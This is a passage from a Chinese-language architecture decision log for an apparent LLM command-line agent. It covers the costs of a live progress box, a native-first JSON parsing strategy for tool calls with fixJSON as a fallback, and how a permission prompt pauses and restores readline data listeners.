**代价：** `Container` 多一个 `insertChild` 接口；`liveBox` 生命周期内要额外维护 `liveFoot` / `liveBoxWidth` / `liveSummaryShown` 三个字段（宽度必须建框时锁定，否则窗口中途变化会让顶底边不同宽）；双时钟（首字前等待 `waitAccumMs` 与流式计时 `streamStartAt`）必须分开，否则两个秒数互相污染。

**参考：** `Log/CHANGE_LOG.md` 2026-09-02 12:33 [Feature✨] 回合级进度指示器

## 2026-07-29 — parseToolCalls 三段策略：原生优先，fixJSON 兜底

**场景：** fixJSON 在修复 JSON 格式错误时，过度处理合法 JSON 转义符（如 `\\`、`\n`），破坏原本合法的 JSON 导致解析失败。

**方案 A（一律先 fixJSON）：** 截取到 JSON 文本后立刻过 fixJSON 再 JSON.parse。

**方案 B（原生优先→fixJSON 兜底）：** 先尝试原生 JSON.parse，失败后再用 fixJSON 修复，再失败则跳过+日志。

**选择：B**

**理由：**
- 主流 LLM（DeepSeek V4 Flash）生成的 JSON 绝大多数是合法的，不需要修复
- fixJSON 的正则替换有副作用（破坏了 `\\U`、把 `\n` 变 `\\n`）
- 三段策略在不同场景各司其职：合法直通 / 格式错误修复 / 彻底非法跳过+日志

**代价：** 偶尔 LLM 生成不合法但 fixJSON 能修复的 JSON，需要多一次 try-catch。

## 2026-07-29 — 权限弹窗采用暂停/恢复 data 监听器策略

**场景：** 权限选择弹窗需要原始模式捕获 ↑↓ 方向键，但直接切换 raw mode 干扰主 readline 的 'data' 事件流。

**方案 A（emitKeypressEvents + setRawMode）：** 用 readline.emitKeypressEvents 激活键盘事件，切换 raw mode 后用 keypress 事件处理选择。

**方案 B（文本选择 1/2/3）：** 不使用 raw mode，用 readline.question() 展示 1/2/3 选项让用户输入数字选择。

**方案 C（暂停/恢复 data 监听器）：** 进入弹窗前保存并移除所有 'data' 监听器，弹窗结束后恢复。

**选择：C**

**理由：**
- 保留了方向键导航的交互体验（方案 B 是退化）
- 暂停/恢复 data 监听器比 emitKeypressEvents 更干净，不会残留监听器
- 非 TTY 环境单独处理自动允许，不碰 raw mode

**代价：** 代码复杂度高于方案 A 和 B。
